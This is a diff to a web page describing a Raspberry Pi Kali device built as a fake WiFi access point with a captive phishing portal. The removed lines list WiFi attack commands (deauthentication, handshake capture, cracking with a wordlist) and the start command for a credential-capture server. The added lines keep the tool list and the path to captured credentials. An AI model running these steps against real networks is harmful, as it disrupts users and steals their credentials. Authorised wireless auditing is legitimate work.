@@ -277,32 +277,23 @@ There's nothing here yet :(
 
             <div class="script-box">
             <pre>
-⚙️ Setup tips from the Pi boot banner:
+⚙️ About the KaliPi
 -------------------------------------
-- sudo ip route add default via 192.168.137.1
-- Use `nmtui` for configuring WiFi
-- Start phishing capture server: 
-  node /home/kali/hackpi-site/html/server.js
+- Built as an improved successor to the deprecated HackPi project  
+- Runs a headless Kali Linux install for performance and stealth  
+- Includes a custom captive portal for phishing credential collection  
+- Designed for ethical hacking, security awareness, and wireless auditing
 
 💻 Wireless Tools:
 ------------------
-Put adapter in monitor mode:
-  airmon-ng start wlan1
-
-Stop monitor mode:
-  airmon-ng stop wlan1mon
-
-Scan SSIDs:
-  airodump-ng wlan1mon
-
-Target a specific BSSID:
-  airodump-ng -c 6 -w capture.pcap -d BSSID wlan1mon
-
-Deauth attack:
-  aireplay-ng --deauth 0 -a ACCESSPOINT_BSSID -c CLIENT_BSSID wlan1mon
-
-Crack captured handshake:
-  aircrack-ng capture.pcap-01.cap -w ~/Attacks/wordlists/rockyou.txt
+aircrack-ng                           - Contains airmon-ng, airodump-ng, aireplay-ng
+hostapd	                              - Creates the fake WiFi access point
+dnsmasq	                              - Lightweight DHCP + DNS server
+nodogsplash	                          - Captive portal redirect engine
+nodejs	                              - Runs the phishing capture script
+npm	                                  - Installs node dependencies if needed
+curl	                                - Used to fetch scripts or setup Node.js cleanly
+git	                                  - Useful for cloning hackpi-site repo
 
 📁 Config & Phish Page Paths:
 -------------------------------
@@ -310,11 +301,11 @@ Credentials captured:
   /home/kali/hackpi-site/html/output.txt
 
 Configs:
-  /etc/hostapd/hostapd.conf     - WAP config
-  /etc/dnsmasq.conf             - DNS/DHCP
-  /etc/dhcp/dhcpd.conf          - Also DHCP
+  /etc/hostapd/hostapd.conf           - WAP config
+  /etc/dnsmasq.conf                   - DNS/DHCP
+  /etc/dhcp/dhcpd.conf                - Also DHCP
   /etc/nodogsplash/htdocs/splash.html - Captive splash page
-  /home/kali/hackpi-site/html   - Web files
+  /home/kali/hackpi-site/html         - Web files
             </pre>
             <button class="copy-btn" onclick="copyScript('script-kalipi')">Copy</button>
             </div>
